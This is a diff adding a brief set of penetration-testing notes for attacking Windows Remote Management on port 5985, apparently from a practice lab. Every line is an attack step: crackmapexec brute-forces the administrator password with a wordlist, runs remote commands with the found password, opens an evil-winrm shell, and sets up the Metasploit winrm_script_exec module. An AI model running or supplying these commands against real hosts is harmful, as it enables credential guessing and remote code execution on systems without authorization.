@@ -1,0 +1,20 @@
+port 5985
+crackmapexec
+
+crackmapexec winrm 192.168.100.55 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt
+
+crackmapexec winrm 192.168.100.55 -u administrator -p tinkerbell -x "whoami"
+crackmapexec winrm 192.168.100.55 -u administrator -p tinkerbell -x "sysinfo"
+
+evil-winrm.rb -u administrator -p 'tinkerbell' -i 192.168.100.55
+
+
+msfconsole -q
+
+search winrm_script
+
+exploit/windows/winrm/winrm_script_exec 
+set RHOST
+set USERNAME
+set PASSWORD
+set FORCE_VBS true
